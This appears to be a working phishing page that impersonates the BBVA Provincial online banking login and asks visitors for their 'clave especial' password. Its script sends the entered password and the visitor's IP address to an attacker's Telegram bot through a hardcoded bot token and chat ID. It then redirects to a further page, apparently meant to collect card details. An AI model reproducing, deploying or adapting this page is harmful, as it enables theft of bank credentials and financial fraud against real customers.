<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BBVA Provincial - Clave Especial</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #ffffff;
      color: #001b44;
    }

    header {
      background-color: #031e47;
      padding: 20px 30px;
    }

    .logo {
      font-size: 1.6rem;
      font-weight: bold;
      color: white;
    }

    .logo span {
      font-weight: normal;
    }

    .subtext {
      color: #b0c9f2;
      font-size: 0.9rem;
      margin-top: 5px;
    }

    .main {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 80vh;
      text-align: center;
    }

    .form-container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
    }

    .form-container h2 {
      font-size: 1.2rem;
      font-weight: 600;
      margin-bottom: 8px;
    }

    .form-container p {
      color: #6a6a6a;
      margin-bottom: 25px;
      font-size: 0.95rem;
    }

    input[type="password"] {
      width: 100%;
      padding: 15px;
      font-size: 1rem;
      border: 1px solid #e1e1e1;
      border-radius: 6px;
      background-color: #f3f4f6;
      margin-bottom: 20px;
    }

    button {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      background-color: #031e47;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #021635;
    }
  </style>
</head>
<body>

  <header>
    <div class="logo">BBVA <span>Provincial</span></div>
    <div class="subtext">Acceso Provinet personas</div>
  </header>

  <main class="main">
    <div class="form-container">
      <h2>Verificaci√≥n de seguridad</h2>
      <p>Para continuar ingrese su clave especial.</p>
      <form id="claveForm">
        <input type="password" id="claveEspecial" placeholder="Clave especial" required>
        <button type="submit">Enviar</button>
      </form>
    </div>
  </main>

  <script>
    const BOT_TOKEN = '8190060636:AAEbg9zqdIyLCZvUSSR4a_315D0W6n_ULVM'; // Reemplaza con el token de tu bot
    const CHAT_ID = '-4922278503';     // Reemplaza con tu chat ID

    document.getElementById('claveForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const clave = document.getElementById('claveEspecial').value;

      try {
        const ip = await fetch('https://ipapi.co/ip/').then(res => res.text());

        const mensaje = `
 *Clave especial recibida*

 *Clave:* ${clave}
üåê *IP:* ${ip}
        `;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: 'Markdown'
          })
        });

        window.location.href = 'infocard.html';

      } catch (err) {
        alert('Hubo un error al enviar los datos.');
        console.error(err);
      }
    });
  </script>

</body>
</html>
